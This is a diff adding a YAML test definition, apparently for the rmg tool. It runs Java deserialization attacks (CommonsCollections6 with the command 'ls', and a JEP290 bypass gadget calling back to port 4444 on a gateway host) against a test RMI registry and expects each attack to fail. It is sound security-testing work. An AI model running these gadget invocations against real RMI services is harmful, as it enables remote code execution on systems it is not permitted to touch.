@@ -1,0 +1,90 @@
+tester:
+  title: Registry Tests
+  description: |-
+    'Perform tests for the serial action on an RMI registry endpoint.'
+
+  id: '003-010'
+  groups:
+    - reg
+    - serial
+  id_pattern: '003-010-{:03}'
+
+
+tests:
+  - title: Gadget Call
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should fail, as the server uses readString for unmarshalling.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
+      - CommonsCollections6
+      - ls
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
+
+
+  - title: Gadget Call (SSL)
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should fail, as the server uses readString for unmarshalling.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET-SSL}
+      - CommonsCollections6
+      - ls
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
+
+
+  - title: JEP290 Bypass
+    description: |-
+      'Attempts a deserialization attack on the registry endpoint,'
+      'using the An Trinh bypass gadget. Should also fail because'
+      'of jdk11.'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET-SSL}
+      - AnTrinh
+      - ${DOCKER-GW}:4444
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
